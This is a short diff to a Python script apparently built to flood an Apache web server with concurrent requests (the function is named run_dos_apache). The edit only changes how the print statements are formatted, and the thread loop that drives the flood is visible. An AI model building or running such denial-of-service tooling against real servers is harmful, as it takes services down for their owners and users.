@@ -32,15 +32,15 @@ def run_dos_apache(url: str=URL_TO_GET):
     # ----- Initial test to ensure everything is okay ----- #
 
     MyThread.thread_function(1)  # Just to ensure that the config is okay
-    print(f"Setup is okay, we now start the loop.")
+    print("Setup is okay, we now start the loop.")
 
     # ----- MAIN LOOP ----- #
 
     thread_list = [MyThread(NUMBER_OF_ATTEMPTS) for i in range(NUMBER_OF_THREADS)]
-    print(f"threads created. list size={len(thread_list)}")
+    print("threads created. list size={}".format(len(thread_list)))
     [thread.start() for thread in thread_list]
-    print(f"threads started")
+    print("threads started")
     #[thread.join() for thread in thread_list]
     for thread in thread_list:
         thread.join()
-    print(f"threads joined")
+    print("threads joined")
